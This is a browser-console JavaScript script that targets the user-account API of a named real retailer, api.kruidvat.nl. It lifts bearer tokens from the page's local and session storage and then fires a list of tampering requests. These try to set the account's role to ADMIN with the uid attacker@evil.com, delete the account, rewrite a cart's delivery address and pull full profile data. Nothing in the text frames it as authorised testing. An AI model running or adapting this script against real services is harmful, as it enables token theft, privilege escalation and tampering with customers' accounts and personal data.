const B='https://api.kruidvat.nl';
let tok=null;
for(const s of [localStorage,sessionStorage])for(let i=0;i<s.length;i++){const k=s.key(i);const v=s.getItem(k);if(k.includes('auth')||/token/i.test(k)){const m=v.match(/[A-Za-z0-9_-]{20,}/);if(m)tok=m[0];}}
const H={'Authorization':'bearer '+tok,'Accept':'application/json','Content-Type':'application/json'};
const tests=[
 ['OPTIONS','/api/v2/kvn-spa/users/current',null],
 ['PUT','/api/v2/kvn-spa/users/current',{uid:'attacker@evil.com',role:'ADMIN',testField:'x'}],
 ['POST','/api/v2/kvn-spa/users/current',{name:'Test'}],
 ['DELETE','/api/v2/kvn-spa/users/current',null],
 ['PUT','/api/v2/kvn-spa/users/current/carts/11032530110',{deliveryAddress:{id:'hack'}}],
 ['GET','/api/v2/kvn-spa/users/current?fields=FULL',null],
 ['GET','/api/v2/kvn-spa/users/current?fields=DEFAULT,BASIC,PROFILE,PREFERENCE,ADDRESS,EMAIL,UID',null]
];
(async()=>{for(const [m,p,b] of tests){try{const r=await fetch(B+p,{method:m,headers:H,credentials:'include',body:b?JSON.stringify(b):undefined});const t=await r.text();console.log(m,r.status,p,'|',t.slice(0,180).replace(/\n/g,' '));}catch(e){console.log('ERR',m,p,e.message)}await new Promise(s=>setTimeout(s,300));}})();
console.log('DONE');
